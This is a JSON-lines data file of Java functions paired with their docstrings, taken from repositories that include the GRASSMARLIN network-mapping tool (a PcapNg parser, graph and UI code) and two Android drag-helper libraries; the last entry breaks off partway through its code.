{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax.\n * If the value is below the minimum, it will be clamped to zero.\n * If the value is above the maximum, it will be clamped to the maximum.\n *\n * @param value Value to clamp\n * @param absMin Absolute value of the minimum significant value to return\n * @param absMax Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private int clampMag(int value, int absMin, int absMax)", "code": "{\n    final int absValue = Math.abs(value);\n    if (absValue < absMin) return 0;\n    if (absValue > absMax) return value > 0 ? absMax : -absMax;\n    return value;\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * The result of a call to this method is equivalent to\n * {@link #processTouchEvent(MotionEvent)} receiving an ACTION_CANCEL event.\n */\n", "func_signal": "public void cancel()", "code": "{\n    mActivePointerId = INVALID_POINTER;\n    clearMotionHistory();\n\n    if (mVelocityTracker != null) {\n        mVelocityTracker.recycle();\n        mVelocityTracker = null;\n    }\n}", "path": "CardSlidePanel\\app\\src\\main\\java\\com\\stone\\card\\ViewDragHelper.java", "repo_name": "taoliuh/CardSlidePanel", "stars": 590, "license": "None", "language": "java", "size": 27007}
{"docstring": "/**\n * @param channel\n * @return The number of bytes to advance the channel\n */\n", "func_signal": "protected int processBlockHeader(SeekableByteChannel channel) throws IOException", "code": "{\n    //Read first 8 bytes of header\n    final byte[] header = new byte[8];\n    ByteBuffer buffer = ByteBuffer.allocate(header.length);\n    final int cbRead = channel.read(buffer);\n    //End of stream\n    if(cbRead == -1) {\n        return -1;\n    } else if(cbRead != 8) {\n        throw new IOException(\"Unable to read start of PcapNg Block Header.\");\n    }\n\n    buffer.rewind();\n    buffer.get(header);\n\n    final int typeBlock = intFromBytes(header, 0, 4, isLittleEndian);\n    final int sizeBlock = intFromBytes(header, 4, 4, isLittleEndian);\n\n    //If we're reading a SHB, then we don't know the endianness and the size can be wrong, so skip the integrity checks.\n    if(typeBlock != 0x0A0D0D0A) {\n        if ((sizeBlock & 3) != 0) {\n            throw new IOException(\"PcapNg contains invalid block size (\" + sizeBlock + \")\");\n        }\n\n        if (typeBlock < 0) {\n            return sizeBlock - 8;\n        }\n    }\n\n    final ByteBuffer bufPacket;\n    final int cbProcessed;\n\n    switch(typeBlock) {\n        case 1: //Interface Description Block\n            //Don't process the trailing size; it will throw off bounds checking when processing options.\n            processIdb(channel, sizeBlock - 12);\n            source.recordTaskProgress(sizeBlock);\n            return 4;   // 4 bytes of trailing size\n        // Skip these blocks (Don't need the data)\n        case 5: //Interface Statistics Block\n        case 7: //IRIG Timestamp Block\n        case 8: //ARINC 429 in AFDX Encapsulation Block\n            source.recordTaskProgress(sizeBlock);\n            return sizeBlock - 8;\n        case 3: //Simple Packet Block\n            source.recordTaskProgress(16);\n            //The Block contains the original packet length (4 bytes) then the packet contents (padded to a 32-bit boundary) then the total length is repeated.\n            channel.position(channel.position() + 4);\n            bufPacket = ByteBuffer.allocateDirect(sizeBlock - 16);\n            channel.read(bufPacket);\n            bufPacket.rewind();\n            cbProcessed = handler.handle(bufPacket, Instant.now().toEpochMilli(), idxFrame++);\n            source.recordTaskProgress(sizeBlock - cbProcessed);\n            //Skip the last 4 bytes which is the repeated size\n            return 4;\n        case 2: //Packet Block (Obsolete, but still has to be readable)\n            //The only difference between these two is the interfaceID is 2 bytes (instead of 4) in the Packet Block, with the following 2 bytes for the Drops Count (not present in Enhanced Packet Block).  Since we use neither, parsing is the same.\n        case 6: //Enhanced Packet Block\n            bufEnhancedHeader.rewind();\n            channel.read(bufEnhancedHeader);\n\n            final int idInterface;\n            if(typeBlock == 2) {\n                idInterface = bufEnhancedHeader.getShort(0);\n            } else {\n                idInterface = bufEnhancedHeader.getInt(0);\n            }\n            final long ts = ((long)bufEnhancedHeader.getInt(4) << 32) | ((long)bufEnhancedHeader.getInt(8) & 0x00000000FFFFFFFFL);\n\n            final int cbCapture = (bufEnhancedHeader.getInt(12) + 3) & ~0x3;  // Round up to the nearest multiple of 32-bits.\n            bufPacket = ByteBuffer.wrap(new byte[cbCapture]);\n            channel.read(bufPacket);\n            bufPacket.rewind();\n            cbProcessed = handler.handle(bufPacket, ts * 1000L / timestampResolutions.get(idInterface), idxFrame++);\n            //Variable length options will be included.\n            source.recordTaskProgress(sizeBlock - cbProcessed);\n            return sizeBlock - (28 + cbCapture);\n        case 4: //Name Resolution Block\n            //TODO: Parse the name resolution block and use the data to augment nodes\n            source.recordTaskProgress(sizeBlock);\n            return sizeBlock - 8;\n        case 0x0A0D0D0A:    //Section Header Block\n            final ByteBuffer blockSectionHeader = ByteBuffer.wrap(new byte[4]);\n            channel.read(blockSectionHeader);\n\n            final int magicNumber = intFromBytes(blockSectionHeader.array(), 0, 4, false);\n            if(magicNumber == 0x1A2B3C4D) {\n                isLittleEndian = false;\n                bufEnhancedHeader.order(ByteOrder.BIG_ENDIAN);\n            } else if(magicNumber == 0x4D3C2B1A) {\n                isLittleEndian = true;\n                bufEnhancedHeader.order(ByteOrder.LITTLE_ENDIAN);\n            } else {\n                throw new IOException(\"BOM Field in Section Header Block is wrong (0x\" + Integer.toHexString(magicNumber) + \")\");\n            }\n\n            final int sizeShb = intFromBytes(header, 4, 4, isLittleEndian);\n\n            source.recordTaskProgress(sizeShb);\n            return sizeShb - 12;\n        //Error conditions of varying severity:\n        case 0x00000BAD:    //Custom block that rewriters can copy into new files.\n        case 0x40000BAD:    //Custom block that rewriters should not copy into new files.\n            Logger.log(this, Severity.Warning, \"PcapNg Files contains unparsable data (\" + sizeBlock + \" bytes)\");\n            source.recordTaskProgress(sizeBlock);\n            return sizeBlock - 8;\n        case 0:\n        default:\n            throw new IOException(\"Unknown block type: 0x\" + (\"0000000\" + Integer.toHexString(typeBlock)).replaceAll(\"^.*(?=.{8}$)\", \"\"));\n    }\n}", "path": "GM3\\data\\plugins\\iadgov.offlinepcap\\PcapNgFileParser.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * If the current session has unsaved changes (isDirty) then ask the user if they want to save the changes.\n * If the user elects to save, if a filename must be specified, then prompt as per \"Save As...\", otherwise Save\n * If the user declines to save, then return.\n * If the user cancels at any point, abort the save and return false.\n */\n", "func_signal": "public void CheckSaveDocument(Runnable onSuccess)", "code": "{\n    if(document.get().isDirty()) {\n        //If the session is clean, there is no reason to prompt.\n        if(document.get().getSavePath() != null) {\n            Optional<ButtonType> result = new Alert(Alert.AlertType.CONFIRMATION, \"Do you want to save changes to \" + document.get().getSavePath().getFileName() + \"?\", ButtonType.YES, ButtonType.NO, ButtonType.CANCEL).showAndWait();\n            if(!result.isPresent() || result.get().equals(ButtonType.CANCEL)) {\n                //Cancel\n            } else if (result.get().equals(ButtonType.NO)) {\n                onSuccess.run();\n            } else if (result.get().equals(ButtonType.YES)) {\n                SaveDocument(document.get().getSavePath(), onSuccess);\n            }\n        } else {\n            Optional<ButtonType> result = new Alert(Alert.AlertType.CONFIRMATION, \"Do you want to save changes to New Session?\", ButtonType.YES, ButtonType.NO, ButtonType.CANCEL).showAndWait();\n            if(!result.isPresent() || result.get().equals(ButtonType.CANCEL)) {\n            } else if (result.get().equals(ButtonType.NO)) {\n                onSuccess.run();\n            } else if (result.get().equals(ButtonType.YES)) {\n                SaveDocument(null, onSuccess);\n            }\n\n        }\n    } else {\n        //If the session isn't dirty, there is nothing to save.\n        onSuccess.run();\n    }\n}", "path": "GM3\\src\\ui\\GrassMarlinFx.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "//</editor-fold>\n// <editor-fold defaultstate=\"collapsed\" desc=\"Internal methods that are used to trigger the processXXX methods.\">\n", "func_signal": "private void Handle_VisualizationCellsChanged(MapChangeListener.Change<? extends TNode,? extends Cell<TNode>> change)", "code": "{\n    if(change.wasRemoved()) {\n        processRemoveVisualNode(change.getKey(), change.getValueRemoved());\n    }\n    if(change.wasAdded()) {\n        processNewVisualNode(change.getKey(), change.getValueAdded());\n    }\n}", "path": "GM3\\src\\ui\\graphing\\Graph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Utility function to bind the disabled state to a boolean value.\n * @param controller A boolean property that is true when the menu item should be enabled.\n * @return self, to facilitate chaining to constructor when building menu.\n */\n", "func_signal": "public ActiveMenuItem bindEnabled(BooleanExpression controller)", "code": "{\n    this.disableProperty().bind(controller.not());\n    return this;\n}", "path": "GM3\\src\\ui\\custom\\fx\\ActiveMenuItem.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Add the nodes and edges of the graph to the provided lists.  This is performed in a manner synchronized with other NetworkGraph operations.\n * @param nodes Collection to receive a copy of the node list.  Nodes will be skipped if null.\n * @param edges Collection to receive a copy of the edge list.  Edges will be skipped if null.\n */\n", "func_signal": "public void GetGraphContents(List<TNode> nodes, List<TEdge> edges)", "code": "{\n    synchronized(lock) {\n        if(nodes != null) {\n            nodes.addAll(this.nodesObservable);\n        }\n        if(edges != null) {\n            edges.addAll(this.edgesObservable);\n        }\n    }\n}", "path": "GM3\\src\\core\\document\\graph\\NetworkGraph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Bulk addition of nodes; duplicates won't be added, but object references won't be adjusted, either.\n * @param nodes The nodes to add to the graph.\n */\n", "func_signal": "public void addNodes(Collection<TNode> nodes)", "code": "{\n    synchronized(lock) {\n        nodes.removeAll(this.nodes.keySet());\n        for(TNode node : nodes) {\n            this.nodes.put(node, node);\n        }\n    }\n}", "path": "GM3\\src\\core\\document\\graph\\NetworkGraph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "//</editor-fold>\n//<editor-fold defaultstate=\"collapsed\" desc=\"Event Hooks\">\n// Internal handlers for list modification\n", "func_signal": "private void Handle_NodeChange(ListChangeListener.Change<? extends TNode> c)", "code": "{\n    final boolean isLayoutRequired = visualization.suspendLayout();\n    try {\n        while (c.next()) {\n            this.loading = true;\n            uiNodes.removeIf(wrapper -> c.getRemoved().contains(wrapper.getNode()));\n            c.getRemoved().forEach(node -> getGroupFactory().getGroup(activeGroup.get(), node.getGroups().get(activeGroup.get())).rebuildHull());\n\n            uiNodes.addAll(c.getAddedSubList().stream().map(this::Handle_WrapNode).collect(Collectors.toList()));\n\n            this.loading = false;\n            this.doneLoading();\n        }\n    } finally {\n        //Do not run the layout if it was already suspended; this happens as part of loading.\n        if(isLayoutRequired) {\n            visualization.resumeLayout(true);\n        }\n        if (scrollPane.getZoomAfterLayout()) {\n            Platform.runLater(() -> scrollPane.zoomToFit());\n        }\n    }\n}", "path": "GM3\\src\\ui\\graphing\\Graph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "//<editor-fold defaultstate=\"collapsed\" desc=\"Phsyical Devices\">\n/**\n * The device XML resembles:\n * <device name=string version=string>\n *     <version ...? />\n *     <port name=string mac=string isTrunk=boolean isConnected=boolean isEnabled=boolean>\n *         <vlan id=integer />...\n *         <endpoint vlan=integer mac=string />...\n *     </port>...\n * </device>\n * @param deviceAttributes\n * @return\n */\n", "func_signal": "protected PhysicalDevice buildDevice(Attributes deviceAttributes)", "code": "{\n    PhysicalDevice result = new PhysicalDevice(deviceAttributes.getValue(\"name\"));\n    result.versionNameProperty().set(deviceAttributes.getValue(\"version\"));\n\n    return result;\n}", "path": "GM3\\src\\core\\document\\serialization\\Grassmarlin_3_2.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Bulk add edges.  Unlike addEdge, this will not look up the nodes for equivalent ones already belonging to the graph,\n * so the caller is responsible for handling the integrity checking of the list.\n * @param edges The edges to add.  The endpoints will be added if they do not exist.\n */\n", "func_signal": "public void addEdges(Collection<TEdge> edges)", "code": "{\n    Set<TNode> nodesToAdd = new HashSet<>();\n    nodesToAdd.addAll(edges.stream().map(edge -> edge.getSource()).collect(Collectors.toList()));\n    nodesToAdd.addAll(edges.stream().map(edge -> edge.getDestination()).collect(Collectors.toList()));\n    synchronized(lock) {\n        addNodes(nodesToAdd);\n        edges.removeAll(this.edges.keySet());\n        for(TEdge edge : edges) {\n            this.edges.put(edge, edge);\n        }\n    }\n}", "path": "GM3\\src\\core\\document\\graph\\NetworkGraph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Like zoomToFit, this fills the screen with the content, but does so by repositioning the content rather than\n * changing the zoom and translation transforms.  This results in nodes remaining unscaled and moving closer or\n * farther from each other permitting, for example, more room for details to be displayed without overlapping.\n *\n * This will distort the graph as the X and Y axes are scaled independently.\n *\n * There is some error but the result is close enough that attention is being spent elsewhere.\n */\n", "func_signal": "public void scaleToWindow()", "code": "{\n    Bounds boundsWorld = calculateCellBounds();\n\n    if(boundsWorld.getWidth() == 0.0 && boundsWorld.getHeight() == 0.0) {\n        zoomReset();\n    } else {\n        //Get the (translated and scaled) coordinates for the top left and width/height\n        Point2D ptTopLeft = new Point2D(\n                -translateTransform.getX() / scaleTransform.getX(),\n                -translateTransform.getY() / scaleTransform.getY()\n        );\n        double width = getWidth() / scaleTransform.getX();\n        double height = getHeight() / scaleTransform.getY();\n\n        //HACK: We know the first child of the zoomGroup is the canvas.\n        Canvas canvas = (Canvas)zoomGroup.getChildren().get(0);\n        CellLayer cells = canvas.getCellLayer();\n\n        for(Node node : cells.getChildren()) {\n            if(node instanceof Cell) {\n                Cell cell = (Cell)node;\n\n                // Start from the top left, normalized against the bounds.\n                double x = cell.getLayoutX() - boundsWorld.getMinX();\n                double y = cell.getLayoutY() - boundsWorld.getMinY();\n                x /= boundsWorld.getWidth();\n                y /= boundsWorld.getHeight();\n                // Rescale to viewport\n                x *= width;\n                y *= height;\n                //Set scaled value shifted by viewport location\n                cell.setLayoutX(x + ptTopLeft.getX());\n                cell.setLayoutY(y + ptTopLeft.getY());\n            }\n        }\n    }\n}", "path": "GM3\\src\\ui\\graphing\\ZoomableScrollPane.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * When the session is cleared, we need to remove all ingested content and, for usability, move them to the preliminary dialog and select them.\n * @param source\n * @param args\n */\n", "func_signal": "protected void Handle_DocumentCleared(Event<Session.DocumentUpdatedEventArgs> source, Session.DocumentUpdatedEventArgs args)", "code": "{\n    List<PreliminaryImportItem> newItems =\n            args.session.getImports().stream().map(completed_import -> {\n                PreliminaryImportItem result = new PreliminaryImportItem(completed_import.getPath().toFile());\n                result.setType(ImportProcessors.processorForClass(completed_import.getType()));\n                return result;\n            }).collect(Collectors.toList());\n    document.get().addPendingImports(newItems);\n    tblPending.getSelectionModel().clearSelection();\n    newItems.forEach(tblPending.getSelectionModel()::select);\n}", "path": "GM3\\src\\ui\\dialog\\importmanager\\ImportDialog.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Clears the lists of nodes and edges.\n * Use cases should prevent this from having a race condition with the add functions, but the possibility exists;\n * proper locking to prevent those conditions would constitute a burden on the more common use case of processing an\n * import.\n *\n * The race condition, as it exists, allows the events to fire incorrectly, however the internal state should always\n * be consistent.\n */\n", "func_signal": "public void clearTopology()", "code": "{\n    synchronized(lock) {\n        edges.clear();\n        nodes.clear();\n    }\n\n    OnGraphCleared.call(new UpdateGraphArgs(this));\n    edgesObservable.clear();\n    nodesObservable.clear();\n}", "path": "GM3\\src\\core\\document\\graph\\NetworkGraph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Find all of the groups of Context Menu items for this location.  This includes lists from factory objects as well as the Canvas.\n * @return A list of lists of menu items; each list will be separated from the others when the context menu is constructed.\n */\n", "func_signal": "protected List<List<MenuItem>> processContextMenu()", "code": "{\n    LinkedList<List<MenuItem>> result = new LinkedList<>();\n    result.add(visualization.getEdgeFactory().getFactoryMenuItems());\n    result.add(visualization.getNodeFactory().getFactoryMenuItems());\n    result.add(visualization.getGroupFactory().getFactoryMenuItems());\n    //The Canvas will handle all layers, which include node, edge, vlans (on Physical Graph), and groups.\n    result.addAll(getVisualization().getCanvas().getContextMenuItems());\n    result.add(menuGraph);\n    return result;\n}", "path": "GM3\\src\\ui\\graphing\\Graph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * @param cntHistory The number of historical memory-usage readings to track.\n */\n", "func_signal": "public MemoryUsageTracker(int cntHistory)", "code": "{\n    filterDepth = new ReadOnlyIntegerWrapper(cntHistory);\n    pctMemoryUsage = new SimpleDoubleProperty(0.0);\n    mbMemoryUsed = new SimpleLongProperty(0);\n    mbMemoryTotal = new SimpleLongProperty(0);\n    pctReadings = new double[cntHistory];\n    reading = new AtomicBoolean(false);\n\n    initComponents();\n\n    //Take the first reading to set the memory reading values\n    TakeReading();\n\n    new Timer().scheduleAtFixedRate(new TimerTask() {\n        @Override\n        public void run() {\n            if (!reading.get()) {\n                reading.set(true);\n                Platform.runLater(MemoryUsageTracker.this::TakeReading);\n                reading.set(false);\n            }\n        }\n    }, 1000, 1000);\n}", "path": "GM3\\src\\ui\\custom\\fx\\MemoryUsageTracker.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "// Called when a new node is added to the graph; the wrapper contains elements that are common to the tree and visualization.\n", "func_signal": "protected void processNewNode(final NodeWrapper<TNode> node)", "code": "{\n    node.getContextItems().clear();\n    node.getContextItems().add(new ActiveMenuItem(\"View Details for \" + node.getNode().titleProperty().get(), EmbeddedIcons.Vista_Report, event -> {\n        dlgDetails.setNode(node.getNode());\n        dlgDetails.showAndWait();\n    }));\n    node.getContextItems().add(new ActiveMenuItem(\"Center in View\", (event) -> {\n        Graph.this.getVisualizationView().centerOn(Graph.this.getVisualization().cellFor(node.getNode()));\n    }));\n}", "path": "GM3\\src\\ui\\graphing\\Graph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "//<editor-fold defaultstate=\"collapsed\" desc=\"Load Physical\">\n", "func_signal": "private void loadPhysical(InputSource source, Session session) throws IOException", "code": "{\n    try {\n        SAXParser parser = SAXParserFactory.newInstance().newSAXParser();\n\n        parser.parse(source, new PhysicalLoadHandler(session));\n    } catch (SAXException | ParserConfigurationException e) {\n        Logger.log(this, Severity.Error, \"Error parsing session information\");\n    }\n}", "path": "GM3\\src\\core\\document\\serialization\\Grassmarlin_3_2.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "//<editor-fold defaultstate=\"collapsed\" desc=\"Load Session\">\n", "func_signal": "private void loadSession(InputSource source, Session session) throws IOException", "code": "{\n    try {\n        SAXParser parser = SAXParserFactory.newInstance().newSAXParser();\n\n        parser.parse(source, new SessionLoadHandler(session));\n    } catch (SAXException | ParserConfigurationException e) {\n        Logger.log(this, Severity.Error, \"Error parsing session information\");\n    }\n}", "path": "GM3\\src\\core\\document\\serialization\\Grassmarlin_3_2.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Adds an edge to the graph, if it doesn't already exist.\n * @param edgeNew The edge to add.\n * @return If the edge was added to the graph, edgeNew is returned.  Otherwise, the edge which already exists is\n * returned.  If the edge is deleted between the time the edge is found to have existed but before returning, null\n * is returned.\n */\n", "func_signal": "public TEdge addEdge(TEdge edgeNew)", "code": "{\n    TNode nodeSource;\n    TNode nodeDestination;\n    TEdge edgeResult;\n    synchronized(lock) {\n        nodeSource = nodes.get(edgeNew.getSource());\n        if(nodeSource == null) {\n            nodeSource = edgeNew.getSource();\n            nodes.put(nodeSource, nodeSource);\n        }\n\n        nodeDestination = nodes.get(edgeNew.getDestination());\n        if(nodeDestination == null) {\n            nodeDestination = edgeNew.getDestination();\n            nodes.put(nodeDestination, nodeDestination);\n        }\n\n        edgeResult = edges.get(edgeNew);\n        if(edgeResult == null) {\n            edgeResult = edgeNew;\n            edges.put(edgeNew, edgeNew);\n        }\n    }\n\n    //Call events outside lock.\n    if(edgeNew.getSource() != nodeSource) {\n        edgeNew.setSource(nodeSource);\n    }\n    if(edgeNew.getDestination() != nodeDestination) {\n        edgeNew.setDestination(nodeDestination);\n    }\n    return edgeResult;\n}", "path": "GM3\\src\\core\\document\\graph\\NetworkGraph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * Launch the Grassmarlin main GUI as a JavaFX application.\n * @param allowPcap Whether or not to enable PCAP features.  Functionality that depends on PCap capabilities will be disabled when this is set to false.\n * @param args Arguments that are passed to the JavaFX launch command.\n */\n", "func_signal": "public static void launchFx(boolean allowPcap, String[] args)", "code": "{\n    pcapAvailable.set(allowPcap);\n    Application.launch(args);\n}", "path": "GM3\\src\\ui\\GrassMarlinFx.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * To be used when a node changes group membership.\n * @param node\n */\n", "func_signal": "public void reprocessNode(final TNode node)", "code": "{\n    final NodeWrapper<TNode> wrapper = uiNodes.stream().filter(wrap -> wrap.getNode().equals(node)).findAny().get();\n    final List<EdgeWrapper<TNode, TEdge>> edges = uiEdges.stream().filter(edge -> edge.getEdge().getSource().equals(node) || edge.getEdge().getDestination().equals(node)).collect(Collectors.toList());\n\n    uiEdges.removeAll(edges);\n    uiNodes.remove(wrapper);\n\n    uiNodes.add(wrapper);\n    uiEdges.addAll(edges);\n}", "path": "GM3\\src\\ui\\graphing\\Graph.java", "repo_name": "nsacyber/GRASSMARLIN", "stars": 817, "license": "other", "language": "java", "size": 34984}
{"docstring": "/**\n * The result of a call to this method is equivalent to\n * {@link #processTouchEvent(MotionEvent)} receiving an ACTION_CANCEL event.\n */\n", "func_signal": "public void cancel()", "code": "{\n    mActivePointerId = INVALID_POINTER;\n    clearMotionHistory();\n\n    if (mVelocityTracker != null) {\n        mVelocityTracker.recycle();\n        mVelocityTracker = null;\n    }\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Tests scrollability within child views of v given a delta of dx.\n *\n * @param v View to test for horizontal scrollability\n * @param checkV Whether the view v passed should itself be checked for scrollability (true),\n *               or just its children (false).\n * @param dx Delta scrolled in pixels along the X axis\n * @param dy Delta scrolled in pixels along the Y axis\n * @param x X coordinate of the active touch point\n * @param y Y coordinate of the active touch point\n * @return true if child views of v can be scrolled by delta of dx.\n */\n", "func_signal": "protected boolean canScroll(View v, boolean checkV, int dx, int dy, int x, int y)", "code": "{\n    if (v instanceof ViewGroup) {\n        final ViewGroup group = (ViewGroup) v;\n        final int scrollX = v.getScrollX();\n        final int scrollY = v.getScrollY();\n        final int count = group.getChildCount();\n        // Count backwards - let topmost views consume scroll distance first.\n        for (int i = count - 1; i >= 0; i--) {\n            // TODO: Add versioned support here for transformed views.\n            // This will not work for transformed views in Honeycomb+\n            final View child = group.getChildAt(i);\n            if (x + scrollX >= child.getLeft() && x + scrollX < child.getRight() &&\n                    y + scrollY >= child.getTop() && y + scrollY < child.getBottom() &&\n                    canScroll(child, true, dx, dy, x + scrollX - child.getLeft(),\n                            y + scrollY - child.getTop())) {\n                return true;\n            }\n        }\n    }\n\n    return checkV && (ViewCompat.canScrollHorizontally(v, -dx) ||\n            ViewCompat.canScrollVertically(v, -dy));\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * {@link #cancel()}, but also abort all motion in progress and snap to the end of any\n * animation.\n */\n", "func_signal": "public void abort()", "code": "{\n    cancel();\n    if (mDragState == STATE_SETTLING) {\n        final int oldX = mScroller.getCurrX();\n        final int oldY = mScroller.getCurrY();\n        mScroller.abortAnimation();\n        final int newX = mScroller.getCurrX();\n        final int newY = mScroller.getCurrY();\n        mCallback.onViewPositionChanged(mCapturedView, newX, newY, newX - oldX, newY - oldY);\n    }\n    setDragState(STATE_IDLE);\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Clamp the magnitude of value for absMin and absMax.\n * If the value is below the minimum, it will be clamped to zero.\n * If the value is above the maximum, it will be clamped to the maximum.\n *\n * @param value Value to clamp\n * @param absMin Absolute value of the minimum significant value to return\n * @param absMax Absolute value of the maximum value to return\n * @return The clamped value with the same sign as <code>value</code>\n */\n", "func_signal": "private float clampMag(float value, float absMin, float absMax)", "code": "{\n    final float absValue = Math.abs(value);\n    if (absValue < absMin) return 0;\n    if (absValue > absMax) return value > 0 ? absMax : -absMax;\n    return value;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Check if we've crossed a reasonable touch slop for the given child view.\n * If the child cannot be dragged along the horizontal or vertical axis, motion\n * along that axis will not count toward the slop check.\n *\n * @param child Child to check\n * @param dx Motion since initial position along X axis\n * @param dy Motion since initial position along Y axis\n * @return true if the touch slop has been crossed\n */\n", "func_signal": "private boolean checkTouchSlop(View child, float dx, float dy)", "code": "{\n    if (child == null) {\n        return false;\n    }\n    final boolean checkHorizontal = mCallback.getViewHorizontalDragRange(child) > 0;\n    final boolean checkVertical = mCallback.getViewVerticalDragRange(child) > 0;\n\n    if (checkHorizontal && checkVertical) {\n        return dx * dx + dy * dy > mTouchSlop * mTouchSlop;\n    } else if (checkHorizontal) {\n        return Math.abs(dx) > mTouchSlop;\n    } else if (checkVertical) {\n        return Math.abs(dy) > mTouchSlop;\n    }\n    return false;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Move the captured settling view by the appropriate amount for the current time.\n * If <code>continueSettling</code> returns true, the caller should call it again\n * on the next frame to continue.\n *\n * @param deferCallbacks true if state callbacks should be deferred via posted message.\n *                       Set this to true if you are calling this method from\n *                       {@link View#computeScroll()} or similar methods\n *                       invoked as part of layout or drawing.\n * @return true if settle is still in progress\n */\n", "func_signal": "public boolean continueSettling(boolean deferCallbacks)", "code": "{\n    if (mDragState == STATE_SETTLING) {\n        boolean keepGoing = mScroller.computeScrollOffset();\n        final int x = mScroller.getCurrX();\n        final int y = mScroller.getCurrY();\n        final int dx = x - mCapturedView.getLeft();\n        final int dy = y - mCapturedView.getTop();\n\n//            if (dx != 0) {\n//                mCapturedView.offsetLeftAndRight(dx);\n//            }\n//            if (dy != 0) {\n//                mCapturedView.offsetTopAndBottom(dy);\n//            }\n\n        if (dx != 0 || dy != 0) {\n            mCallback.onViewPositionChanged(mCapturedView, x, y, dx, dy);\n        }\n\n        if (keepGoing && x == mScroller.getFinalX() && y == mScroller.getFinalY()) {\n            // Close enough. The interpolator/scroller might think we're still moving\n            // but the user sure doesn't.\n            mScroller.abortAnimation();\n            keepGoing = false;\n        }\n\n        if (!keepGoing) {\n            if (deferCallbacks) {\n                mParentView.post(mSetIdleRunnable);\n            } else {\n                setDragState(STATE_IDLE);\n            }\n        }\n    }\n\n    return mDragState == STATE_SETTLING;\n}", "path": "app\\src\\main\\java\\com\\hejunlin\\dragvideo\\CustomViewDragHelper.java", "repo_name": "smartyuge/DragVideo", "stars": 658, "license": "apache-2.0", "language": "java", "size": 6988}
{"docstring": "/**\n * Process a touch event received by the parent view. This method will dispatch callback events\n * as needed before returning. The parent view's onTouchEvent implementation should call this.\n *\n * @param ev The touch event received by the parent view\n */\n", "func_signal": "public void processTouchEvent(MotionEvent ev)", "code": "{\n    final int action = MotionEventCompat.getActionMasked(ev);\n    final int actionIndex = MotionEventCompat.getActionIndex(ev);\n\n    if (action == MotionEvent.ACTION_DOWN) {\n        // Reset things for a new event stream, just in case we didn't get\n        // the whole previous stream.\n        cancel();\n    }\n\n    if (mVelocityTracker == null) {\n        mVelocityTracker = VelocityTracker.obtain();\n    }\n    mVelocityTracker.addMovement(ev);\n\n    switch (action) {\n        case MotionEvent.ACTION_DOWN: {\n            final float x = ev.getX();\n            final float y = ev.getY();\n            final int pointerId = MotionEventCompat.getPointerId(ev, 0);\n            final View toCapture = findTopChildUnder((int) x, (int) y);\n\n            saveInitialMotion(x, y, pointerId);\n\n            // Since the parent is already directly processing this touch event,\n            // there is no reason to delay for a slop before dragging.\n            // Start immediately if possible.\n            tryCaptureViewForDrag(toCapture, pointerId);\n\n            final int edgesTouched = mInitialEdgesTouched[pointerId];\n            if ((edgesTouched & mTrackingEdges) != 0) {\n                mCallback.onEdgeTouched(edgesTouched & mTrackingEdges, pointerId);\n            }\n            